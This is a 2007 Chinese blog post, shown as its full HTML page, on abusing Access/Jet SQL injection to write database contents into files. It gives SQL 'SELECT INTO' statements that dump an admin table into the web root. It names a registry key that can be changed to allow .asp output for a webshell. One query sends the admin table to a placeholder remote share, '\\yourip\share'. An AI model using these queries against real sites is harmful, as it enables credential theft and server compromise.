<!DOCTYPE html><html lang="zh" class="scroll-smooth"><head><meta charset="UTF-8"><style>:where(img){height:auto}</style><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><link rel="canonical" href="https://n2g.cn/posts/pjblog-2007-03-17/"><meta name="generator" content="Astro v4.2.1"><!-- General Meta Tags --><title>利用Access SQL注入导出ASP文件的方法 | Xio's</title><meta name="title" content="利用Access SQL注入导出ASP文件的方法 | Xio's"><meta name="description" content="<p>已经听N个人过说有人已经发现SQL注入Access得到webshell的技术了，也只是听说而已，具体的细节还是不得而知。</p>
<p>最近在看的书中一章提到Jet的安全，然后灵光一闪，呵呵，发现了一种可以利用access导出asp的方法，分享之。</p>
<h2>传统的导出方法</h2>
<p>几个月之前网上就流传利用SQL注入Access导出数据库内容到文本文件（可导出txt、htm、html等格式）的方法：</p>
<pre><code class=&quot;language-sql&quot;>Select * into [test.txt] in 'd:\web\' 'text;' from admin
</code></pre>
<p>执行上述语句，在d:\web目录下就会生成test.txt文件，其内容就是表admin的内容。但是导出asp格式就不行，会说&quot;不能更新，数据库或对象为只读&quot;。</p>
<h2>问题的根源</h2>
<p>其实控制导出文件后缀是存储在注册表的，具体键值是：</p>
<pre><code>HKEY_LOCALMACHINE\Software\Microsoft\Jet\4.0\Engines\Text\DisableExtension
</code></pre>
<p>默认情况下值为<code>&quot;!txt,csv,tab,asc,tmp,htm,html&quot;</code>，如果我们把asp也添加进去的话，呵呵，就可以导出asp格式的文件了。</p>
<p>这个方法跟那个调用Access的Shell函数执行命令一样，要修改注册表，所以利用不是很大。</p>
<h2>扩展思路</h2>
<p>顺便提一下，前面提到的导出文本文件的方法如果不知道web路径貌似可以导出到自己机器的哦：</p>
<pre><code class=&quot;language-sql&quot;>Select * into [test.txt] in '\\yourip\share' 'text;' from admin
</code></pre>
<h2>实际测试</h2>
<p>我在我自己的blog上测试，没有得用注入，直接exec sql语句形成：</p>
<pre><code class=&quot;language-sql&quot;>Select gb_Author into [222.txt] in 'D:\wwwroot\starstudio\wwwroot\' 'text;' from blog_Guestbook
</code></pre>
<p>竟然真生成了txt文件了，当时可以访问 starstudio.cn/222.txt（现在域名已经失效，starstudio已经躺在本地硬盘中了）</p>
<p>不行可以试试访问............利用注点怎么得asp还得好好研究下</p>
"><meta name="author" content="Xio"><link rel="sitemap" href="/sitemap-index.xml"><!-- Open Graph / Facebook --><meta property="og:title" content="利用Access SQL注入导出ASP文件的方法 | Xio's"><meta property="og:description" content="<p>已经听N个人过说有人已经发现SQL注入Access得到webshell的技术了，也只是听说而已，具体的细节还是不得而知。</p>
<p>最近在看的书中一章提到Jet的安全，然后灵光一闪，呵呵，发现了一种可以利用access导出asp的方法，分享之。</p>
<h2>传统的导出方法</h2>
<p>几个月之前网上就流传利用SQL注入Access导出数据库内容到文本文件（可导出txt、htm、html等格式）的方法：</p>
<pre><code class=&quot;language-sql&quot;>Select * into [test.txt] in 'd:\web\' 'text;' from admin
</code></pre>
<p>执行上述语句，在d:\web目录下就会生成test.txt文件，其内容就是表admin的内容。但是导出asp格式就不行，会说&quot;不能更新，数据库或对象为只读&quot;。</p>
<h2>问题的根源</h2>
<p>其实控制导出文件后缀是存储在注册表的，具体键值是：</p>
<pre><code>HKEY_LOCALMACHINE\Software\Microsoft\Jet\4.0\Engines\Text\DisableExtension
</code></pre>
<p>默认情况下值为<code>&quot;!txt,csv,tab,asc,tmp,htm,html&quot;</code>，如果我们把asp也添加进去的话，呵呵，就可以导出asp格式的文件了。</p>
<p>这个方法跟那个调用Access的Shell函数执行命令一样，要修改注册表，所以利用不是很大。</p>
<h2>扩展思路</h2>
<p>顺便提一下，前面提到的导出文本文件的方法如果不知道web路径貌似可以导出到自己机器的哦：</p>
<pre><code class=&quot;language-sql&quot;>Select * into [test.txt] in '\\yourip\share' 'text;' from admin
</code></pre>
<h2>实际测试</h2>
<p>我在我自己的blog上测试，没有得用注入，直接exec sql语句形成：</p>
<pre><code class=&quot;language-sql&quot;>Select gb_Author into [222.txt] in 'D:\wwwroot\starstudio\wwwroot\' 'text;' from blog_Guestbook
</code></pre>
<p>竟然真生成了txt文件了，当时可以访问 starstudio.cn/222.txt（现在域名已经失效，starstudio已经躺在本地硬盘中了）</p>
<p>不行可以试试访问............利用注点怎么得asp还得好好研究下</p>
"><meta property="og:url" content="https://n2g.cn/posts/pjblog-2007-03-17/"><meta property="og:image" content="https://n2g.cn/posts/%E5%88%A9%E7%94%A8access-sql%E6%B3%A8%E5%85%A5%E5%AF%BC%E5%87%BAasp%E6%96%87%E4%BB%B6%E7%9A%84%E6%96%B9%E6%B3%95.png"><!-- Article Published/Modified time --><meta property="article:published_time" content="2007-03-17T10:30:00.000Z"><!-- Twitter --><meta property="twitter:card" content="summary_large_image"><meta property="twitter:url" content="https://n2g.cn/posts/pjblog-2007-03-17/"><meta property="twitter:title" content="利用Access SQL注入导出ASP文件的方法 | Xio's"><meta property="twitter:description" content="<p>已经听N个人过说有人已经发现SQL注入Access得到webshell的技术了，也只是听说而已，具体的细节还是不得而知。</p>
<p>最近在看的书中一章提到Jet的安全，然后灵光一闪，呵呵，发现了一种可以利用access导出asp的方法，分享之。</p>
<h2>传统的导出方法</h2>
<p>几个月之前网上就流传利用SQL注入Access导出数据库内容到文本文件（可导出txt、htm、html等格式）的方法：</p>
<pre><code class=&quot;language-sql&quot;>Select * into [test.txt] in 'd:\web\' 'text;' from admin
</code></pre>
<p>执行上述语句，在d:\web目录下就会生成test.txt文件，其内容就是表admin的内容。但是导出asp格式就不行，会说&quot;不能更新，数据库或对象为只读&quot;。</p>
<h2>问题的根源</h2>
<p>其实控制导出文件后缀是存储在注册表的，具体键值是：</p>
<pre><code>HKEY_LOCALMACHINE\Software\Microsoft\Jet\4.0\Engines\Text\DisableExtension
</code></pre>
<p>默认情况下值为<code>&quot;!txt,csv,tab,asc,tmp,htm,html&quot;</code>，如果我们把asp也添加进去的话，呵呵，就可以导出asp格式的文件了。</p>
<p>这个方法跟那个调用Access的Shell函数执行命令一样，要修改注册表，所以利用不是很大。</p>
<h2>扩展思路</h2>
<p>顺便提一下，前面提到的导出文本文件的方法如果不知道web路径貌似可以导出到自己机器的哦：</p>
<pre><code class=&quot;language-sql&quot;>Select * into [test.txt] in '\\yourip\share' 'text;' from admin
</code></pre>
<h2>实际测试</h2>
<p>我在我自己的blog上测试，没有得用注入，直接exec sql语句形成：</p>
<pre><code class=&quot;language-sql&quot;>Select gb_Author into [222.txt] in 'D:\wwwroot\starstudio\wwwroot\' 'text;' from blog_Guestbook
</code></pre>
<p>竟然真生成了txt文件了，当时可以访问 starstudio.cn/222.txt（现在域名已经失效，starstudio已经躺在本地硬盘中了）</p>
<p>不行可以试试访问............利用注点怎么得asp还得好好研究下</p>
"><meta property="twitter:image" content="https://n2g.cn/posts/%E5%88%A9%E7%94%A8access-sql%E6%B3%A8%E5%85%A5%E5%AF%BC%E5%87%BAasp%E6%96%87%E4%BB%B6%E7%9A%84%E6%96%B9%E6%B3%95.png"><!-- Google Font --><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin=""><link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:ital,wght@0,400;0,500;0,600;0,700;1,400;1,600&amp;display=swap" rel="stylesheet"><link href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@400;700&amp;display=swap" rel="stylesheet"><meta name="theme-color" content=""><meta name="astro-view-transitions-enabled" content="true"><meta name="astro-view-transitions-fallback" content="animate"><!-- 
    <script is:inline src="/toggle-theme.js"></script> --><style>@keyframes astroFadeInOut{0%{opacity:1}to{opacity:0}}@keyframes astroFadeIn{0%{opacity:0}}@keyframes astroFadeOut{to{opacity:0}}@keyframes astroSlideFromRight{0%{transform:translate(100%)}}@keyframes astroSlideFromLeft{0%{transform:translate(-100%)}}@keyframes astroSlideToRight{to{transform:translate(100%)}}@keyframes astroSlideToLeft{to{transform:translate(-100%)}}@media (prefers-reduced-motion){::view-transition-group(*),::view-transition-old(*),::view-transition-new(*){animation:none!important}[data-astro-transition-scope]{animation:none!important}}
</style>
<link rel="stylesheet" href="/_astro/index.skGcHkCz.css">
<style>.waline-container:where(.astro-ksttp56e){border-top:1px solid #ddd;margin:2em 0;padding:1em 0}</style><script type="module" src="/_astro/hoisted.JbHLA6Ne.js"></script><style>[data-astro-transition-scope=astro-fam6wyqg-1]{view-transition-name:pjblog-2007-03-17}@layer astro{::view-transition-old(pjblog-2007-03-17){animation-name:astroFadeOut;animation-duration:.18s;animation-timing-function:cubic-bezier(.76,0,.24,1);animation-fill-mode:both}::view-transition-new(pjblog-2007-03-17){animation-name:astroFadeIn;animation-duration:.18s;animation-timing-function:cubic-bezier(.76,0,.24,1);animation-fill-mode:both}[data-astro-transition=back]::view-transition-old(pjblog-2007-03-17){animation-name:astroFadeOut;animation-duration:.18s;animation-timing-function:cubic-bezier(.76,0,.24,1);animation-fill-mode:both}[data-astro-transition=back]::view-transition-new(pjblog-2007-03-17){animation-name:astroFadeIn;animation-duration:.18s;animation-timing-function:cubic-bezier(.76,0,.24,1);animation-fill-mode:both}}[data-astro-transition-fallback=old] [data-astro-transition-scope=astro-fam6wyqg-1],[data-astro-transition-fallback=old][data-astro-transition-scope=astro-fam6wyqg-1]{animation-name:astroFadeOut;animation-duration:.18s;animation-timing-function:cubic-bezier(.76,0,.24,1);animation-fill-mode:both}[data-astro-transition-fallback=new] [data-astro-transition-scope=astro-fam6wyqg-1],[data-astro-transition-fallback=new][data-astro-transition-scope=astro-fam6wyqg-1]{animation-name:astroFadeIn;animation-duration:.18s;animation-timing-function:cubic-bezier(.76,0,.24,1);animation-fill-mode:both}[data-astro-transition=back][data-astro-transition-fallback=old] [data-astro-transition-scope=astro-fam6wyqg-1],[data-astro-transition=back][data-astro-transition-fallback=old][data-astro-transition-scope=astro-fam6wyqg-1]{animation-name:astroFadeOut;animation-duration:.18s;animation-timing-function:cubic-bezier(.76,0,.24,1);animation-fill-mode:both}[data-astro-transition=back][data-astro-transition-fallback=new] [data-astro-transition-scope=astro-fam6wyqg-1],[data-astro-transition=back][data-astro-transition-fallback=new][data-astro-transition-scope=astro-fam6wyqg-1]{animation-name:astroFadeIn;animation-duration:.18s;animation-timing-function:cubic-bezier(.76,0,.24,1);animation-fill-mode:both}</style></head> <body>  <header> <div class="content"> <div class="nav-container"> <div class="top-nav-wrap"> <a href="/" class="logo"> <span>Xio's</span> </a> <nav id="nav-menu"> <button class="focus-outline hamburger-menu" aria-label="Open Menu" aria-expanded="false" aria-controls="menu-items"> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="menu-icon"> <line x1="7" y1="12" x2="21" y2="12" class="line"></line> <line x1="3" y1="6" x2="21" y2="6" class="line"></line> <line x1="12" y1="18" x2="21" y2="18" class="line"></line> <line x1="18" y1="6" x2="6" y2="18" class="close"></line> <line x1="6" y1="6" x2="18" y2="18" class="close"></line> </svg> </button> <ul id="menu-items" class="display-none sm:flex"> <li> <a href="/" class="">
日志
</a> </li> <li> <a href="/links/" class="">
邻居
</a> </li> <li> <a href="/about/" class="">
关于
</a> </li> <li> <a href="/search/" class="focus-outline flex group hover:text-skin-accent inline-block p-3 sm:p-1" aria-label="search" title="Search"> <svg xmlns="http://www.w3.org/2000/svg" class="scale-125 sm:scale-100"><path d="M19.023 16.977a35.13 35.13 0 0 1-1.367-1.384c-.372-.378-.596-.653-.596-.653l-2.8-1.337A6.962 6.962 0 0 0 16 9c0-3.859-3.14-7-7-7S2 5.141 2 9s3.14 7 7 7c1.763 0 3.37-.66 4.603-1.739l1.337 2.8s.275.224.653.596c.387.363.896.854 1.384 1.367l1.358 1.392.604.646 2.121-2.121-.646-.604c-.379-.372-.885-.866-1.391-1.36zM9 14c-2.757 0-5-2.243-5-5s2.243-5 5-5 5 2.243 5 5-2.243 5-5 5z"></path> </svg> <span class="sr-only">Search</span> </a> </li> </ul> </nav> </div> </div> </div> </header>   <main id="main-content" class="content"> <div class="date-box post-date"><span class="italic text-sm">Mar<!-- --> <!-- -->17<!-- -->, <!-- -->2007</span></div> <h1 class="post-title" data-astro-transition-scope="astro-fam6wyqg-1">利用Access SQL注入导出ASP文件的方法</h1> <article id="article" role="article" class="post-content"> <div><p>已经听N个人过说有人已经发现SQL注入Access得到webshell的技术了，也只是听说而已，具体的细节还是不得而知。</p>
<p>最近在看的书中一章提到Jet的安全，然后灵光一闪，呵呵，发现了一种可以利用access导出asp的方法，分享之。</p>
<h2>传统的导出方法</h2>
<p>几个月之前网上就流传利用SQL注入Access导出数据库内容到文本文件（可导出txt、htm、html等格式）的方法：</p>
<pre><code class="language-sql">Select * into [test.txt] in 'd:\web\' 'text;' from admin
</code></pre>
<p>执行上述语句，在d:\web目录下就会生成test.txt文件，其内容就是表admin的内容。但是导出asp格式就不行，会说"不能更新，数据库或对象为只读"。</p>
<h2>问题的根源</h2>
<p>其实控制导出文件后缀是存储在注册表的，具体键值是：</p>
<pre><code>HKEY_LOCALMACHINE\Software\Microsoft\Jet\4.0\Engines\Text\DisableExtension
</code></pre>
<p>默认情况下值为<code>"!txt,csv,tab,asc,tmp,htm,html"</code>，如果我们把asp也添加进去的话，呵呵，就可以导出asp格式的文件了。</p>
<p>这个方法跟那个调用Access的Shell函数执行命令一样，要修改注册表，所以利用不是很大。</p>
<h2>扩展思路</h2>
<p>顺便提一下，前面提到的导出文本文件的方法如果不知道web路径貌似可以导出到自己机器的哦：</p>
<pre><code class="language-sql">Select * into [test.txt] in '\\yourip\share' 'text;' from admin
</code></pre>
<h2>实际测试</h2>
<p>我在我自己的blog上测试，没有得用注入，直接exec sql语句形成：</p>
<pre><code class="language-sql">Select gb_Author into [222.txt] in 'D:\wwwroot\starstudio\wwwroot\' 'text;' from blog_Guestbook
</code></pre>
<p>竟然真生成了txt文件了，当时可以访问 starstudio.cn/222.txt（现在域名已经失效，starstudio已经躺在本地硬盘中了）</p>
<p>不行可以试试访问............利用注点怎么得asp还得好好研究下</p>
</div> </article> <div class="related-post"> <div class="prev-post"> <a href="/posts/pjblog-2007-03-16"> <svg xmlns="http://www.w3.org/2000/svg" class="prev-svg"> <path d="M12.707 17.293 8.414 13H18v-2H8.414l4.293-4.293-1.414-1.414L4.586 12l6.707 6.707z"></path> </svg>
上一篇：动网BOKE的CSS跨站漏洞分析 </a> </div> <div class="next-post"> <a href="/posts/2011-01-29">
下一篇：开始记录 某些点点滴滴 <svg xmlns="http://www.w3.org/2000/svg" class="next-svg"> <path d="m11.293 17.293 1.414 1.414L19.414 12l-6.707-6.707-1.414 1.414L15.586 11H6v2h9.586z"></path> </svg> </a> </div> </div> <div class="comment"> <div class="astro-ksttp56e waline-container"> <div id="waline-comments" class="astro-ksttp56e"></div> </div>  <link rel="stylesheet" href="https://unpkg.com/@waline/client@v3/dist/waline.css">  </div> </main> <footer class="astro-sz7xmlte mt-auto"> <div class="astro-sz7xmlte content"> <div class="astro-sz7xmlte footer-wrapper"> <div class="astro-sz7xmlte copyright-wrapper"> <span class="astro-sz7xmlte"><img src="data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' width='200' height='200'%3e%3ccircle cx='100' cy='100' r='50' fill='orange'/%3e%3ccircle cx='85' cy='90' r='10' fill='white'/%3e%3ccircle cx='85' cy='90' r='5'/%3e%3ccircle cx='115' cy='90' r='10' fill='white'/%3e%3ccircle cx='115' cy='90' r='5'/%3e%3cpath fill='white' d='m100 110-5-10h10z'/%3e%3cpath fill='orange' d='M85 50 75 70h20zm30 0-10 20h20z'/%3e%3c/svg%3e" alt="Xio's" width="30" height="30" class="astro-sz7xmlte" fetchpriority="high"> </span> <span class="astro-sz7xmlte">Xio's © 2026 .</span> <span class="astro-sz7xmlte slogan">一切从简，记录生活。</span> <a target="_blank" href="/rss.xml" class="astro-sz7xmlte rss-link" aria-label="rss feed" title="RSS FEED"> <span class="astro-sz7xmlte sr-only">RSS</span> <svg xmlns="http://www.w3.org/2000/svg" class="astro-sz7xmlte rss-icon"><path d="M19 20.001C19 11.729 12.271 5 4 5v2c7.168 0 13 5.832 13 13.001h2z" class="astro-sz7xmlte"></path><path d="M12 20.001h2C14 14.486 9.514 10 4 10v2c4.411 0 8 3.589 8 8.001z" class="astro-sz7xmlte"></path><circle cx="6" cy="18" r="2" class="astro-sz7xmlte"></circle> </svg> </a> <!-- 隐藏的归档链接，可通过特定方式访问 --> <a href="/archive/" class="astro-sz7xmlte archive-link" aria-label="archive" title="时光档案"> <span class="astro-sz7xmlte sr-only">Archive</span> </a> </div> </div> </div> </footer>      <script>function createProgressBar(){const o=document.createElement("div");o.className="progress-container fixed top-0 z-10 h-1 w-full bg-skin-fill";const e=document.createElement("div");e.className="progress-bar h-1 w-0 bg-skin-accent",e.id="myBar",o.appendChild(e),document.body.appendChild(o)}createProgressBar();function updateScrollProgress(){const o=document.body.scrollTop||document.documentElement.scrollTop,e=document.documentElement.scrollHeight-document.documentElement.clientHeight;if(e>0){const n=o/e*100;if(document){const t=document.getElementById("myBar");t&&(t.style.width=n+"%")}}}document.addEventListener("scroll",updateScrollProgress);function addHeadingLinks(){let o=Array.from(document.querySelectorAll("h2, h3, h4, h5, h6"));for(let e of o){e.classList.add("group");let n=document.createElement("a");n.innerText="#",n.className="heading-link hidden group-hover:inline-block ml-2",n.href="#"+e.id,n.ariaHidden="true",e.appendChild(n)}}addHeadingLinks();function attachCopyButtons(){let o="Copy",e=Array.from(document.querySelectorAll("pre"));for(let t of e){let c=document.createElement("div");c.style.position="relative";let d=document.createElement("button");d.className="copy-code absolute right-3 -top-3 rounded bg-skin-card px-2 py-1 text-xs leading-4 text-skin-base font-medium",d.innerHTML=o,t.setAttribute("tabindex","0"),t.appendChild(d),t?.parentNode?.insertBefore(c,t),c.appendChild(t),d.addEventListener("click",async()=>{await n(t,d)})}async function n(t,c){let r=t.querySelector("code")?.innerText;await navigator.clipboard.writeText(r??""),c.innerText="Copied",setTimeout(()=>{c.innerText=o},700)}}attachCopyButtons();function backToTop(){document.querySelector("#back-to-top")?.addEventListener("click",()=>{document.body.scrollTop=0,document.documentElement.scrollTop=0})}backToTop();
</script></body></html>